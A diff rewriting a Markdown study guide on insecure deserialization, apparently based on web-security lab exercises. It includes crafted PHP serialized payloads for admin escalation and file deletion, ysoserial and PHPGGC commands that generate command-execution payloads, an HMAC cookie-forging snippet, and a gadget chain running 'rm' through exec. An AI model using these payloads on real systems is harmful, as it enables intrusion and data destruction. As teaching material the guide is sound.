@@ -1,2382 +1,905 @@
 # Insecure Deserialization
 
-## Overview
+## Table of Contents
 
-Insecure Deserialization occurs when an application deserializes user-controlled data without verifying its integrity, authenticity, or expected structure.
-
-An attacker can modify serialized data or supply an entirely different serialized object. During deserialization, the application reconstructs the object and may automatically execute methods associated with that object.
-
-Unlike many vulnerabilities, exploitation can occur during the deserialization process itself before normal application logic is reached. :contentReference[oaicite:0]{index=0}
-
----
-
-## Serialization and Deserialization
-
-### Serialization
-
-Serialization converts an object into a format that can be:
-
-- Stored in files
-- Stored in databases
-- Stored in sessions
-- Sent over a network
-- Stored in cookies
-
-Example:
-
-```php
-$user = new User();
-$user->name = "carlos";
-$user->isAdmin = false;
-```
-
-Serialized:
-
-```php
-O:4:"User":2:{s:4:"name";s:6:"carlos";s:7:"isAdmin";b:0;}
-```
+1. [What is Serialization & Deserialization?](#1-what-is-serialization--deserialization)
+2. [What is Insecure Deserialization?](#2-what-is-insecure-deserialization)
+3. [Why It Exists — Root Causes](#3-why-it-exists--root-causes)
+4. [Identifying Serialized Data on the Wire](#4-identifying-serialized-data-on-the-wire)
+5. [Attack Techniques](#5-attack-techniques)
+   - 5.1 [Modifying Serialized Object Attributes](#51-modifying-serialized-object-attributes)
+   - 5.2 [Modifying Data Types (PHP Loose Comparison)](#52-modifying-data-types-php-loose-comparison)
+   - 5.3 [Exploiting Application Functionality via Serialized Objects](#53-exploiting-application-functionality-via-serialized-objects)
+   - 5.4 [Arbitrary Object Injection](#54-arbitrary-object-injection)
+6. [Magic Methods — The Deserialization Hook](#6-magic-methods--the-deserialization-hook)
+7. [Gadget Chains](#7-gadget-chains)
+   - 7.1 [What a Gadget Chain Is](#71-what-a-gadget-chain-is)
+   - 7.2 [Pre-Built Gadget Chains](#72-pre-built-gadget-chains)
+   - 7.3 [Documented Gadget Chains](#73-documented-gadget-chains)
+   - 7.4 [Building a Custom Gadget Chain](#74-building-a-custom-gadget-chain)
+8. [PHAR Deserialization (PHP)](#8-phar-deserialization-php)
+9. [Memory Corruption via Deserialization](#9-memory-corruption-via-deserialization)
+10. [Chaining Deserialization with Secondary Vulnerabilities](#10-chaining-deserialization-with-secondary-vulnerabilities)
+11. [Impact Assessment](#11-impact-assessment)
+12. [Defense & Prevention](#12-defense--prevention)
+13. [Quick Reference Cheat Sheet](#13-quick-reference-cheat-sheet)
 
 ---
 
-### Deserialization
+## 1. What is Serialization & Deserialization?
 
-Deserialization converts serialized data back into an object.
+**Serialization** converts a complex in-memory object (with all its fields, attributes, and state) into a flat, sequential byte stream — a format that can be stored, transmitted, or passed between processes.
 
-Example:
+**Deserialization** is the reverse: restoring a byte stream back to a fully functional object in memory, exactly as it was when serialized — including all attribute values, including private ones.
 
-```php
-$user = unserialize($cookie);
-```
+### Simple Analogy
 
-The application reconstructs:
-
-```php
-$user->name = "carlos";
-$user->isAdmin = false;
-```
-
----
-
-## How The Vulnerability Occurs
+Serialization is like packing a piece of furniture into flat-pack form for shipping — the table is disassembled and every component is labeled with its type and size. Deserialization is the person on the other end following those labels to reassemble the table. Insecure deserialization is when the recipient assembles whatever instructions arrive in the box — even if the box was swapped by an attacker who replaced the instructions with ones that build a trapdoor instead of a table.
 
 ### Normal Flow
 
-```text
-Object
-    ↓
-Serialize
-    ↓
-Cookie / Session / Database
-    ↓
-Deserialize
-    ↓
-Object Restored
 ```
+[Server-side Object in Memory]
+    │  (serialize)
+    ▼
+[Flat byte stream / string]
+    │  (transmit: cookie, API, file, database)
+    ▼
+[Flat byte stream / string]
+    │  (deserialize)
+    ▼
+[Object reconstructed in memory — used by application]
+```
+
+### Language Terminology
+
+| Language | Serialize | Deserialize |
+|----------|-----------|-------------|
+| PHP | `serialize()` | `unserialize()` |
+| Java | `ObjectOutputStream.writeObject()` | `ObjectInputStream.readObject()` |
+| Python | `pickle.dumps()` | `pickle.loads()` |
+| Ruby | `Marshal.dump()` | `Marshal.load()` |
+
+> **Note:** Python's "pickling" and Ruby's "marshalling" are the same concept as serialization. Treat them identically when hunting for vulnerabilities.
 
 ---
 
-### Vulnerable Flow
+## 2. What is Insecure Deserialization?
 
-```text
-Object
-    ↓
-Serialize
-    ↓
-Sent To User
-    ↓
-User Modifies Data
-    ↓
-Deserialize
-    ↓
-Application Trusts Object
+Insecure deserialization occurs when **user-controllable data is passed to a deserialization function** without sufficient validation. The application trusts the incoming byte stream to contain a safe, expected object — and the attacker supplies something else.
+
+### The Core Danger — Object Injection
+
+Deserialization functions do not verify that the byte stream represents the expected class. They will instantiate and reconstruct **any class available to the application** — not just the expected one.
+
 ```
+Application expects:   User object  { username: "carlos", isAdmin: false }
+Attacker supplies:     Any class available to the application with any attribute values
+```
+
+An object of a completely unexpected class will be instantiated. Even if this causes an exception later, **the damage may already be done** — many deserialization exploits fire during the instantiation process itself, before the application touches the object.
+
+### Why This Matters
+
+- The attack surface is not just the application's own code — it includes every class in every library the application imports
+- Attacks can trigger automatically during deserialization, not just during subsequent use of the object
+- Strongly typed languages are still vulnerable — the type check happens after instantiation
 
 ---
 
-## Common Locations
+## 3. Why It Exists — Root Causes
 
-### Cookies
-
-```http
-Cookie: session=Tzo0OiJVc2VyIjoyOnt...
-```
-
----
-
-### Session Storage
-
-```text
-PHP Sessions
-Java Sessions
-Rails Sessions
-```
+| Root Cause | Explanation |
+|------------|-------------|
+| Misplaced trust | Developers treat serialized data as internal — "users can't read binary formats" — when in fact binary formats are just as manipulable |
+| Late validation | Checks are applied after deserialization — too late to prevent the attack, which fires during instantiation |
+| Dependency sprawl | Modern applications import dozens of libraries, each with their own classes. Any of those classes can be weaponized as gadgets |
+| Impossible to sanitize | Validation logic cannot anticipate every possible gadget chain across all dependencies. The only safe answer is not deserializing untrusted data at all |
 
 ---
 
-### API Parameters
+## 4. Identifying Serialized Data on the Wire
 
-```json
-{
-  "token":"serialized-data"
+### Where to Look
+
+Serialized objects are passed as user-controlled data anywhere the server needs to persist or transmit state:
+
+- Session cookies
+- Hidden form fields
+- API request bodies
+- `Referer` / custom HTTP headers
+- Database-stored values read back later (second-order)
+- Filenames passed to file processing functions
+
+### PHP Serialization Format
+
+PHP serialized objects are human-readable strings. Learning the format allows direct manual manipulation without needing extra scripts.
+
+**Format breakdown:**
+
+```
+O:4:"User":2:{s:4:"name";s:6:"carlos";s:10:"isLoggedIn";b:1;}
+
+O:4:"User"         → Object, class name is 4 chars: "User"
+:2:                → 2 attributes follow
+{                  → open attribute block
+s:4:"name"         → key: string, 4 chars, "name"
+s:6:"carlos"       → value: string, 6 chars, "carlos"
+s:10:"isLoggedIn"  → key: string, 10 chars, "isLoggedIn"
+b:1                → value: boolean true
+}                  → close attribute block
+```
+
+**PHP type prefixes:**
+
+| Prefix | Type | Example |
+|--------|------|---------|
+| `s:N:"value"` | String (N = length) | `s:5:"admin"` |
+| `i:N` | Integer | `i:42` |
+| `b:N` | Boolean (0=false, 1=true) | `b:1` |
+| `d:N` | Float | `d:3.14` |
+| `N` | Null | `N;` |
+| `a:N:{...}` | Array (N = count) | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}` |
+| `O:N:"Class":M:{...}` | Object (N=class name length, M=attr count) | See above |
+
+**Source code indicator:** Look for `unserialize()` in PHP source code — this is where deserialization happens.
+
+### Java Serialization Format
+
+Java uses a binary format. Visual recognition:
+
+| Location | Marker | Value |
+|----------|--------|-------|
+| Raw hex | Magic bytes | `AC ED` |
+| Base64-encoded | First characters | `rO0` |
+
+**Source code indicator:** Any class implementing `java.io.Serializable` can be serialized. Look for `readObject()` calls in the codebase — these are deserialization points.
+
+### Ruby Serialization Format
+
+Ruby's Marshal format is binary. Base64-encoded Marshal data typically begins with `BAh`. Look in session cookies and API responses.
+
+**Source code indicator:** `Marshal.load()` — this is the deserialization sink.
+
+### Quick Recognition
+
+```
+PHP:      O:4:"User":2:{...}          human-readable string
+Java:     AC ED (hex) / rO0 (base64)  binary
+Ruby:     BAh... (base64)             binary
+Python:   \x80\x04... (pickle)        binary
+```
+
+> **Attacker note:** Always check cookies first. Session cookies containing serialized objects are the most common injection point — they are user-controlled, transmitted with every request, and often consumed by privileged application code. If a cookie is Base64-encoded, decode it first. If the result looks binary or contains the PHP `O:` prefix, it is a deserialization vector.
+
+---
+
+## 5. Attack Techniques
+
+### 5.1 Modifying Serialized Object Attributes
+
+**Situation:** The application deserializes a user-supplied cookie or parameter and uses attribute values to make authorization decisions, without re-checking against the database.
+
+**Original serialized object (from cookie):**
+```
+O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
+```
+
+**Modified object (isAdmin flipped to true):**
+```
+O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
+```
+
+Re-encode (Base64 → URL-encode) and submit as the session cookie.
+
+**What happens:**
+```
+Server deserializes cookie → creates User object with isAdmin = true
+Application checks: if ($user->isAdmin) → true → grants admin access
+```
+
+**Why it works:** The application trusts the deserialized object state without verifying it against a server-side source of truth (the database). The integrity of the serialized data is never checked.
+
+> **Attacker note:** Any boolean, integer, or role-related attribute is worth flipping. Also look for attributes like `accessLevel`, `role`, `userType`, `permissions`. The access check pattern `if (deserializedObject->privilege)` is the most common vulnerable pattern.
+
+---
+
+### 5.2 Modifying Data Types (PHP Loose Comparison)
+
+**Situation:** The application uses PHP's loose comparison operator (`==`) to compare a deserialized attribute value against a stored value. PHP performs implicit type coercion in loose comparisons.
+
+**PHP loose comparison behavior:**
+
+| Comparison | Result | PHP version |
+|-----------|--------|-------------|
+| `0 == "Example string"` | `true` | PHP 7.x and below only |
+| `5 == "5 of something"` | `true` | All versions |
+| `5 == "5"` | `true` | All versions |
+| `0 == "Example string"` | `false` | PHP 8+ |
+
+**Vulnerable code pattern:**
+```php
+$login = unserialize($_COOKIE);
+if ($login['password'] == $password) {
+    // authenticated
 }
 ```
 
----
+**Attack:** Change the `password` attribute from a string to the integer `0`:
 
-### Hidden Form Fields
-
-```html
-<input type="hidden" value="serialized-object">
+```
+Original:  s:8:"password";s:12:"correcthorse"
+Modified:  s:8:"password";i:0
 ```
 
----
-
-### Cache Storage
-
-```text
-Redis
-Memcached
+**What happens:**
+```
+Deserialized password = integer 0
+Stored password = string "correcthorse" (does not start with a digit)
+PHP evaluates: 0 == "correcthorse" → converts "correcthorse" to 0 → 0 == 0 → true
+Authentication bypass
 ```
 
----
+**Why it works:** `unserialize()` preserves the data type from the stream — the integer `0` arrives as an integer, not the string `"0"`. If the value had come from a form field, it would be a string and the bypass would not work. Deserialization is what makes this possible.
 
-### Message Queues
-
-```text
-RabbitMQ
-Kafka
-```
+> **Critical:** When changing data types in a PHP serialized object, the type prefix must be updated (`s:` → `i:`) and the length indicator must be removed (integers have no length field). Forgetting this corrupts the object and the server may silently discard it rather than erroring.
 
 ---
 
-## Why Deserialization Is Dangerous
+### 5.3 Exploiting Application Functionality via Serialized Objects
 
-When an object is reconstructed:
+**Situation:** The application uses attribute values from deserialized objects as inputs to dangerous functions — file operations, database queries, system calls. The attacker can set attribute values to arbitrary paths or values.
 
-- Properties are restored
-- Internal state is restored
-- Methods may execute automatically
-- Magic methods may trigger automatically
+**Example — file deletion via profile picture path:**
 
-The application assumes the object is trusted.
+The application stores a user object with an `avatar_link` attribute. On account deletion, it calls `unlink($user->avatar_link)` to delete the profile picture.
 
-The attacker controls the object.
-
----
-
-# Identifying Insecure Deserialization
-
-## Step 1 — Look For Serialized Data
-
-### PHP
-
-Often appears as:
-
-```php
-O:4:"User":2:{...}
+**Original object:**
+```
+s:11:"avatar_link";s:19:"/uploads/carlos.jpg"
 ```
 
-Indicators:
-
-```text
-O:
-s:
-i:
-b:
-a:
+**Modified object:**
+```
+s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
 ```
 
-Example:
+When the account deletion endpoint is triggered, the application reads the `avatar_link` from the deserialized cookie and calls `unlink("/home/carlos/morale.txt")` — deleting an arbitrary file.
 
-```php
-O:4:"User":2:{s:8:"username";s:6:"carlos";}
-```
+**Why it works:** The application was written assuming the avatar path only ever points to images in the upload directory. The deserialization step gives the attacker full control over what value `avatar_link` holds — the downstream function call is never designed to handle attacker input.
+
+> **Attacker note:** Look for attributes whose names suggest file paths (`path`, `file`, `image`, `avatar`, `template`, `log`, `backup`). Any functionality that reads from or writes to filesystem paths using deserialized attribute values is a target. Account deletion and profile update endpoints are particularly useful because they intentionally perform filesystem operations.
 
 ---
 
-### Java
+### 5.4 Arbitrary Object Injection
 
-Serialized Java objects often start with:
+**Situation:** Source code or backup files are accessible (e.g. `.php~` backup extension). The attacker can read class definitions and find classes with magic methods that perform dangerous operations.
 
-```text
-ac ed
-```
+**Discovery technique:** If the application references `/libs/CustomTemplate.php`, request `/libs/CustomTemplate.php~` — web servers sometimes expose backup files with a tilde extension that should not be publicly accessible.
 
-Hex:
+**Example — PHP `__destruct()` with `unlink()`:**
 
-```text
-AC ED 00 05
-```
-
-Base64:
-
-```text
-rO0
-```
-
-Example:
-
-```text
-rO0ABXNy...
-```
-
----
-
-### Ruby
-
-Common indicators:
-
-```text
-BAh
-```
-
-Base64 encoded:
-
-```text
-BAh7CEki...
-```
-
----
-
-### Python Pickle
-
-Common indicators:
-
-```text
-gASV
-```
-
-Example:
-
-```text
-gASVJAAAAAAAAA...
-```
-
----
-
-## Step 2 — Find User Control
-
-Check whether serialized data can be modified.
-
-Common locations:
-
-```text
-Cookies
-Headers
-Parameters
-Hidden fields
-Session tokens
-```
-
----
-
-## Step 3 — Modify Data
-
-Change:
-
+Discovered class definition:
 ```php
-isAdmin=false
-```
-
-To:
-
-```php
-isAdmin=true
-```
-
-Observe application behavior.
-
----
-
-# Exploitation Methodology
-
-## Technique 1 — Modify Object Attributes
-
-This is usually the first technique attempted after confirming that serialized data can be modified and accepted by the application.
-
-The objective is to determine whether the application trusts properties stored inside the serialized object.
-
-Many applications store important state information directly inside serialized objects.
-
-Examples:
-
-```text
-role
-isAdmin
-permissions
-accessLevel
-userId
-accountId
-subscription
-```
-
-When deserialization occurs, these values are restored into the reconstructed object.
-
-The application often assumes these values were originally generated by the server and therefore can be trusted.
-
-If integrity protection is missing, the attacker controls these values.
-
----
-
-### How It Works Internally
-
-Consider the following object:
-
-```php
-$user = new User();
-$user->username = "carlos";
-$user->isAdmin = false;
-```
-
-Serialized:
-
-```php
-O:4:"User":2:{
-s:8:"username";s:6:"carlos";
-s:7:"isAdmin";b:0;
-}
-```
-
-When the application receives this object:
-
-```php
-$user = unserialize($cookie);
-```
-
-PHP reconstructs:
-
-```php
-$user->username = "carlos";
-$user->isAdmin = false;
-```
-
-The application may later perform:
-
-```php
-if($user->isAdmin)
-{
-    showAdminPanel();
-}
-```
-
-The authorization decision depends entirely on the property stored inside the object.
-
----
-
-### Attacker Modification
-
-Original:
-
-```php
-s:7:"isAdmin";b:0;
-```
-
-Modified:
-
-```php
-s:7:"isAdmin";b:1;
-```
-
-After deserialization:
-
-```php
-$user->isAdmin = true;
-```
-
-The application now believes the user is an administrator.
-
----
-
-### What To Test
-
-Look for properties controlling:
-
-```text
-Authorization
-Authentication
-Ownership
-Business Logic
-```
-
-Common examples:
-
-```text
-role
-isAdmin
-permissions
-accessLevel
-userId
-accountId
-customerId
-balance
-credits
-subscription
-```
-
----
-
-### What To Observe
-
-Successful exploitation often results in:
-
-```text
-Additional functionality
-Admin panels
-Different responses
-Access to restricted resources
-```
-
-The objective is to determine:
-
-```text
-Does the application trust attacker-controlled object properties?
-```
-
----
-
-## Technique 2 — Modify Data Types
-
-Many applications validate values but fail to validate the type of those values.
-
-Developers often assume that a property will always contain the expected data type.
-
-Example:
-
-```php
-$object->isAdmin = false;
-```
-
-Expected type:
-
-```php
-boolean
-```
-
-Attacker-controlled object:
-
-```php
-$object->isAdmin = "true";
-```
-
-or:
-
-```php
-$object->isAdmin = 1;
-```
-
----
-
-### How It Works Internally
-
-Applications frequently perform validation using loose comparisons.
-
-Example:
-
-```php
-if($user->role == "admin")
-```
-
-or:
-
-```php
-if($token == $storedToken)
-```
-
-These comparisons do not strictly verify type.
-
-PHP automatically converts values during comparison.
-
-Example:
-
-```php
-0 == false
-```
-
-returns:
-
-```php
-true
-```
-
-Likewise:
-
-```php
-"1" == true
-```
-
-returns:
-
-```php
-true
-```
-
-Unexpected type conversions may completely change application behavior.
-
----
-
-### Testing Strategy
-
-Modify values using different types.
-
-Examples:
-
-```text
-String → Integer
-Integer → String
-String → Boolean
-Integer → Boolean
-Value → Null
-Value → Empty Array
-```
-
-Example:
-
-Original:
-
-```php
-role = "user"
-```
-
-Modified:
-
-```php
-role = true
-```
-
-or:
-
-```php
-role = 1
-```
-
----
-
-### What To Observe
-
-Look for:
-
-```text
-Authentication Bypass
-Authorization Bypass
-Logic Changes
-Different Responses
-```
-
-Even when property values appear correct, changing the type may trigger unexpected code paths.
-
----
-
-### Why This Technique Matters
-
-Developers often focus on validating values:
-
-```text
-admin
-user
-premium
-```
-
-but forget to validate:
-
-```text
-boolean
-string
-integer
-null
-array
-```
-
-As a result:
-
-```text
-Type Confusion
-Logic Bypass
-Privilege Escalation
-```
-
-become possible.
-
----
-
-## Technique 3 — Abuse Application Functionality
-
-Not every deserialization vulnerability leads directly to privilege escalation.
-
-Sometimes the object controls application functionality.
-
-The attacker manipulates properties that are later used by backend code.
-
-Examples:
-
-```text
-file_path
-template
-image
-avatar
-url
-logfile
-cache_file
-```
-
-These properties may eventually reach dangerous functions.
-
----
-
-### How It Works Internally
-
-Consider:
-
-```php
-$template = $object->template;
-include($template);
-```
-
-The application assumes:
-
-```php
-$template
-```
-
-contains a trusted value.
-
-Example:
-
-```php
-templates/profile.php
-```
-
-Attacker changes it to:
-
-```php
-../../config.php
-```
-
-After deserialization:
-
-```php
-include("../../config.php");
-```
-
-executes.
-
----
-
-### File Operations
-
-Example:
-
-```php
-unlink($object->file);
-```
-
-Original:
-
-```php
-uploads/avatar.jpg
-```
-
-Modified:
-
-```php
-../../important-file.txt
-```
-
-Result:
-
-```text
-Arbitrary File Deletion
-```
-
----
-
-### URL Operations
-
-Example:
-
-```php
-file_get_contents($object->url);
-```
-
-Original:
-
-```text
-https://example.com/image.jpg
-```
-
-Modified:
-
-```text
-http://127.0.0.1/admin
-```
-
-Result:
-
-```text
-SSRF
-```
-
----
-
-### Common Targets
-
-```text
-File Paths
-URLs
-Templates
-Configuration Files
-Images
-Logs
-Backup Files
-Cache Files
-```
-
----
-
-### What To Observe
-
-Look for application functionality that performs:
-
-```text
-File Read
-File Write
-File Delete
-SSRF
-Path Traversal
-Local File Inclusion
-```
-
-The goal is to determine whether object properties influence dangerous backend operations.
-
----
-
-## Technique 4 — Arbitrary Object Injection
-
-This is the most powerful deserialization technique.
-
-Previous techniques modify an existing object.
-
-Example:
-
-```php
-User
-```
-
-becomes:
-
-```php
-User
-{
-    isAdmin=true
-}
-```
-
-The class remains the same.
-
-Arbitrary Object Injection is different.
-
-The attacker replaces the expected object with a completely different class.
-
-Expected:
-
-```php
-User
-```
-
-Injected:
-
-```php
-CustomTemplate
-```
-
----
-
-### How It Works Internally
-
-Applications often perform:
-
-```php
-unserialize($data);
-```
-
-without validating the expected class.
-
-As long as the class exists on the server:
-
-```php
-CustomTemplate
-```
-
-will be instantiated.
-
-The application never intended users to create this object.
-
-Deserialization creates it anyway.
-
----
-
-### Why This Is Dangerous
-
-Every class contains:
-
-```text
-Properties
-Methods
-Internal Logic
-```
-
-The attacker gains access to functionality that may never be exposed through the application.
-
-Example:
-
-```php
-class CustomTemplate
-{
-    public $file;
-
-    function __destruct()
-    {
-        unlink($this->file);
+class CustomTemplate {
+    public $lock_file_path;
+
+    function __destruct() {
+        // Invoked automatically when the object is garbage collected
+        unlink($this->lock_file_path);
     }
 }
 ```
 
-Normally users never interact with this class.
+**Crafted payload — inject a CustomTemplate object:**
+```
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
 
-During deserialization:
+Base64 + URL-encode and submit as the session cookie.
 
-```php
-O:14:"CustomTemplate":1:{
-s:4:"file";
-s:23:"/home/carlos/morale.txt";
+**What happens:**
+```
+Server deserializes cookie
+→ instantiates CustomTemplate with lock_file_path = "/home/carlos/morale.txt"
+→ at end of request, PHP garbage collects the object
+→ __destruct() fires automatically
+→ unlink("/home/carlos/morale.txt") executes
+→ arbitrary file deleted
+```
+
+**Why it works:** `unserialize()` will instantiate any class in the application's namespace. The application expected a `User` object but gets a `CustomTemplate` — and PHP doesn't care. The `__destruct()` magic method fires automatically regardless of what the application does with the object.
+
+> **Attacker note:** The PHP backup file trick (`.php~`, `.php.bak`, `.php.swp`) works because developers push source files to production and web servers serve files by extension. `.php~` has no handler — it gets served as plain text rather than executed. Always probe known PHP file paths with these extensions.
+
+---
+
+## 6. Magic Methods — The Deserialization Hook
+
+Magic methods are automatically invoked by the runtime when specific lifecycle events occur on an object. They do not need to be explicitly called — they fire by themselves.
+
+### Why Magic Methods Are Critical for Deserialization Attacks
+
+Some magic methods fire **during the deserialization process itself** — before the application code has any opportunity to validate or use the object. This means:
+
+- The attack executes the moment the byte stream is deserialized
+- The application never needs to "use" the object in a dangerous way
+- The attacker only needs to get the serialized data into the deserialization function
+
+### PHP Magic Methods Reference
+
+| Method | When It Fires |
+|--------|--------------|
+| `__construct()` | When a new object is created (does NOT fire during `unserialize()`) |
+| `__destruct()` | When the object is garbage collected — fires at end of request |
+| `__wakeup()` | **Immediately when `unserialize()` is called** — first magic method to fire |
+| `__sleep()` | When `serialize()` is called |
+| `__toString()` | When the object is used as a string |
+| `__get($name)` | When an undefined property is read |
+| `__set($name, $value)` | When an undefined property is written |
+| `__call($name, $args)` | When an undefined method is called |
+| `__invoke()` | When the object is called as a function |
+
+> **Attacker note:** `__wakeup()` and `__destruct()` are the highest-value methods for deserialization attacks. `__wakeup()` fires first and synchronously — perfect for triggering code immediately. `__destruct()` fires at the end of every request — reliable and automatic. `__toString()` and `__get()` are useful mid-chain when you need to pass an object into a string or property context.
+
+### Java Magic Methods Reference
+
+| Method | When It Fires |
+|--------|--------------|
+| `readObject()` | During `ObjectInputStream.readObject()` — fires during deserialization |
+| `readResolve()` | After `readObject()` — can substitute a different object |
+| `finalize()` | When the object is garbage collected |
+
+**Custom `readObject()` pattern:**
+```java
+private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+    in.defaultReadObject();
+    // Any code here executes during deserialization
 }
 ```
 
-PHP automatically creates:
+If a class declares its own `readObject()`, that code runs automatically when the class is deserialized — even before the application uses the object.
 
-```php
-new CustomTemplate()
+---
+
+## 7. Gadget Chains
+
+### 7.1 What a Gadget Chain Is
+
+A **gadget** is a snippet of existing application or library code that can be used to perform a specific operation when invoked with attacker-controlled data. Individual gadgets are benign in isolation — the danger emerges when they are **chained together**.
+
+```
+[Magic Method — Kick-off Gadget]
+    │  invokes a method on an attacker-controlled attribute
+    ▼
+[Intermediate Gadget]
+    │  passes data to another method
+    ▼
+[Intermediate Gadget]
+    │  passes data to another method
+    ▼
+[Sink Gadget]
+    └─► exec(), unlink(), file_put_contents(), SQL query, etc.
 ```
 
-and stores:
+**Key insight:** The attacker does not inject code. All the code in a gadget chain already exists on the server. The attacker only controls the **data** that flows through the chain — the path the data takes is determined by which classes and methods are chained together.
 
-```php
-$this->file="/home/carlos/morale.txt"
+**Prerequisite for gadget chain attacks:**
+1. The application deserializes user-controlled data
+2. At least one class has a magic method that fires during deserialization
+3. That magic method, directly or through further method calls, eventually passes attacker-controlled data into a dangerous sink
+
+### 7.2 Pre-Built Gadget Chains
+
+Many popular frameworks and libraries contain known exploitable gadget chains, discovered and documented by security researchers. Because these libraries are widely used, any application importing them may be vulnerable to the same chain.
+
+**ysoserial (Java):**
+
+A collection of pre-built Java deserialization gadget chains. Each chain targets a specific library (e.g. `CommonsCollections`, `Spring`, `Hibernate`). Usage:
+
+```bash
+# Generate a serialized payload executing a command via CommonsCollections4
+java -jar ysoserial-all.jar CommonsCollections4 'id' | base64
+
+# For Java 16+ (module system requires explicit opens)
+java \
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+  --add-opens=java.base/java.net=ALL-UNNAMED \
+  --add-opens=java.base/java.util=ALL-UNNAMED \
+  -jar ysoserial-all.jar CommonsCollections4 'id' | base64
 ```
 
-When the object is destroyed:
+**ysoserial detection-only chains (no RCE required):**
 
-```php
-__destruct()
+| Chain | What It Does | Use Case |
+|-------|-------------|----------|
+| `URLDNS` | Triggers a DNS lookup to a supplied URL | Detect deserialization without RCE; works on all Java versions; no library dependency |
+| `JRMPClient` | Triggers a TCP connection to a supplied IP | Detect in environments where DNS egress is blocked; supply internal IP vs. firewalled IP and compare response times |
+
+**PHPGGC (PHP):**
+
+Equivalent tool for PHP frameworks. Contains chains for Symfony, Laravel, Guzzle, Monolog, and others.
+
+```bash
+# Generate RCE payload for Symfony RCE4 chain
+./phpggc Symfony/RCE4 exec 'id' | base64
 ```
 
-executes automatically.
+**Using a pre-built chain when a signature check exists:**
 
-Result:
+If the application signs its serialized cookies (e.g. HMAC), the signature must be regenerated after replacing the token with the malicious payload. This requires obtaining the secret key first — look for:
+- Debug endpoints leaking environment variables (e.g. `phpinfo.php`)
+- Developer comments in source code revealing config file locations
+- Error messages reflecting internal configuration
 
-```text
-Arbitrary File Deletion
+Once the key is found:
+```php
+<?php
+$object = "PHPGGC-GENERATED-PAYLOAD";
+$secretKey = "LEAKED-KEY";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+```
+
+> **Attacker note:** When a pre-built chain fails, the first question is whether the target actually uses the library the chain targets. Identify the framework from HTTP response headers (`X-Powered-By`), error messages, or URL structures. Then try all chains for that framework before moving on to custom chain development.
+
+### 7.3 Documented Gadget Chains
+
+Between pre-built tools and fully custom research, a middle ground exists: manually adapting publicly documented exploits.
+
+Search for `[Framework/Language] deserialization gadget chain` + the specific version number. Security blog posts, GitHub repositories, and conference talks frequently document full chains with working proof-of-concept code. Adapt the command being executed; the chain structure itself can often be used verbatim.
+
+**Ruby example — universal deserialization gadget for Ruby 2.x–3.x:**
+
+Publicly documented chains exist for Ruby's Marshal format. The typical adaptation needed is only:
+1. Change the command from the example (`id`) to the desired payload
+2. Ensure the output is Base64-encoded for cookie injection
+
+### 7.4 Building a Custom Gadget Chain
+
+Required when no pre-built or documented chain exists for the target. Almost always requires source code access.
+
+**Step-by-step process:**
+
+```
+Step 1: Find a kick-off gadget
+        → Search for classes with magic methods that fire during deserialization
+        → PHP: __wakeup(), __destruct()
+        → Java: readObject()
+        → Does the magic method directly execute dangerous code on attacker-controlled data?
+          YES → Exploit directly
+          NO  → Use it as the chain entry point
+
+Step 2: Trace data flow from the kick-off gadget
+        → What methods does the magic method call?
+        → Which of those methods can receive attacker-controlled values?
+        → Do any of them call further methods? Follow every branch.
+
+Step 3: Find a sink gadget
+        → A sink is a method that does something dangerous: exec(), unlink(),
+          file_put_contents(), eval(), a SQL query, etc.
+        → The sink must be reachable from the kick-off gadget via a chain
+          where every step accepts attacker-controlled data
+
+Step 4: Construct the payload
+        → Work backwards from the sink to the kick-off gadget
+        → Set each object's attributes to point to the next gadget in the chain
+        → Serialize the fully constructed object graph
+
+Step 5: Test for secondary vulnerabilities
+        → Each gadget in the chain is another potential injection point
+        → If data passes through a SQL query gadget, inject SQLi
+        → If data is used in a template, inject SSTI
+```
+
+**PHP custom chain example (conceptual):**
+
+Discovered classes:
+```php
+class CustomTemplate {
+    public $default_desc_type;
+    public $desc;
+    // __wakeup() creates: new Product($this->default_desc_type, $this->desc)
+}
+
+class DefaultMap {
+    public $callback;
+    // __get($name): calls call_user_func($this->callback, $name)
+    //               executes callback with the non-existent property name as argument
+}
+```
+
+**Data flow analysis:**
+```
+__wakeup() fires on CustomTemplate
+→ Product constructor called with $default_desc_type and $desc
+→ Product reads $default_desc_type from $desc (which is a DefaultMap object)
+→ DefaultMap.__get("rm /home/carlos/morale.txt") fires
+→ call_user_func("exec", "rm /home/carlos/morale.txt")
+→ OS command executes
+```
+
+**Serialized payload:**
+```
+O:14:"CustomTemplate":2:{
+  s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";
+  s:4:"desc";O:10:"DefaultMap":1:{
+    s:8:"callback";s:4:"exec";
+  }
+}
 ```
 
 ---
 
-### What To Look For
+## 8. PHAR Deserialization (PHP)
 
-Classes containing:
+### What PHAR Is
 
-```php
-__construct()
-__wakeup()
-__destruct()
-__toString()
+PHP Archive (`.phar`) is a file format for packaging PHP applications — similar to Java's JAR. PHP exposes a `phar://` stream wrapper for reading PHAR files through filesystem functions.
+
+**Critical property:** PHAR manifest files contain serialized PHP metadata. When PHP processes a `phar://` stream via any filesystem function, **that metadata is automatically deserialized** — even if the application never explicitly calls `unserialize()`.
+
+### Why This Matters
+
+This creates a deserialization vector that bypasses the obvious code-review indicator (`unserialize()` calls). Instead, the attack path is:
+
+```
+Upload a PHAR file disguised as a permitted type (e.g. JPEG)
+          │
+          ▼
+Trigger a filesystem operation on the uploaded file using phar:// scheme
+          │
+          ▼
+PHP processes the phar:// stream → PHAR metadata deserialized automatically
+          │
+          ▼
+Magic methods (__wakeup(), __destruct()) fire → gadget chain executes
 ```
 
-Classes performing:
+### Filesystem Functions That Trigger PHAR Deserialization
+
+Any PHP filesystem function triggers deserialization when given a `phar://` path:
 
 ```php
-system()
-exec()
-shell_exec()
-eval()
-include()
-require()
-unlink()
-fopen()
+file_exists()      file_get_contents()    copy()
+is_file()          file_put_contents()    rename()
+include()          fopen()                unlink()
